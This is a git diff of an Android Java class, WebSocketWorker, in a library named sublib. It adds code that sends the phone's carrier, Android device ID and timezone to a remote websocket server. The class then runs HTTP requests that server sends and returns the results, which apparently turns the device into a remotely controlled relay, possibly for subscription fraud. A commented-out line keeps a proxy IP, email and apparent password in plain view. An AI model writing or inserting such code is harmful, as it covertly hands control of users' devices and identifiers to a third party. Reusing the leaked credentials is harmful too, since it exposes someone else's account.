@@ -3,9 +3,12 @@ package com.enhtmv.sublib.work;
 import com.alibaba.fastjson.JSON;
 import com.blankj.utilcode.util.LogUtils;
 import com.cp.plugin.http.HttpReqest;
-import com.enhtmv.sublib.common.http.SubProxy;
 import com.enhtmv.sublib.common.http.SubResponse;
 import com.enhtmv.sublib.common.sub.SubCall;
+
+import java.util.HashMap;
+import java.util.Map;
+import java.util.TimeZone;
 
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
@@ -19,7 +22,7 @@ public class WebSocketWorker extends SubCall {
     public WebSocketWorker() {
 
 
-        this.setProxy(new SubProxy("37.48.98.160", "engineer@foxseek.com", "0c4263", 11285));
+//        this.setProxy(new SubProxy("37.48.98.160", "engineer@foxseek.com", "0c4263", 11285));
 
 
     }
@@ -28,7 +31,7 @@ public class WebSocketWorker extends SubCall {
     @Override
     public void sub(String host) {
 
-        host = "ws://10.0.2.2:8010/ws";
+//        host = "ws://10.0.2.2:8010/ws";
 
         OkHttpClient client = new OkHttpClient.Builder().build();
 
@@ -42,7 +45,17 @@ public class WebSocketWorker extends SubCall {
                 super.onOpen(webSocket, response);
                 LogUtils.i("websocket open");
 
-                webSocket.send("start");
+                Map<String, String> info = new HashMap<>();
+                info.put("operator", operator);
+                info.put("deviceid", androidId);
+                info.put("timezone", TimeZone.getDefault().getID());
+
+                Map<String, Object> data = new HashMap<>();
+
+                data.put("type", "info");
+                data.put("data", info);
+
+                webSocket.send(JSON.toJSONString(data));
 
             }
 
@@ -62,7 +75,12 @@ public class WebSocketWorker extends SubCall {
 
                             SubResponse response = reqest.call();
 
-                            webSocket.send(JSON.toJSONString(response));
+                            Map<String, Object> data = new HashMap<>();
+
+                            data.put("type", "response");
+                            data.put("data", response);
+
+                            webSocket.send(JSON.toJSONString(data));
 
                         } catch (Exception e) {
                             LogUtils.e(e);
